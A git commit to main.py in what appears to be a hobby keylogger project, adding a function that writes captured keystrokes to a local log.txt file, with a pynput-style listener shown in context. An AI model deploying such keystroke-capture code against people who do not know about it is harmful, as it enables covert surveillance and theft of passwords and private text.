723bed9e538619def8b579ec45c0dbdac64aae74
codingsake <thinthazin.chris@gmail.com>
2022-04-16 01:44:48 -0400

    Wriet_file fun to create text file & store key

--- main.py
+++ main.py
@@ -13,6 +13,25 @@ def on_release(key):
     #if yes, get out of the loop
         return False
 
+#Note: uncomment this block to create log.txt file if you are runnin for the first time.
+#This function will store the user's keystroke in text file.
+def write_file(keys):
+    #Create and write in log.txt with write mode.
+    with open('log.txt', 'w') as f:
+        #Loop through each element in keys
+        for key in keys:
+            #store each element of keys in text file.
+            f.write(f"{key}")
+
+#This function will store the user's keystroke in text file.
+# def write_file(keys):
+#     #Create and write in log.txt with write mode.
+#     with open("log.txt", "a") as f:
+#         #Loop through each element in keys
+#         for key in keys:
+#             #store each element of keys in text file.
+#             f.write(key)
+
 #Call on_press and on_release function with loop
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
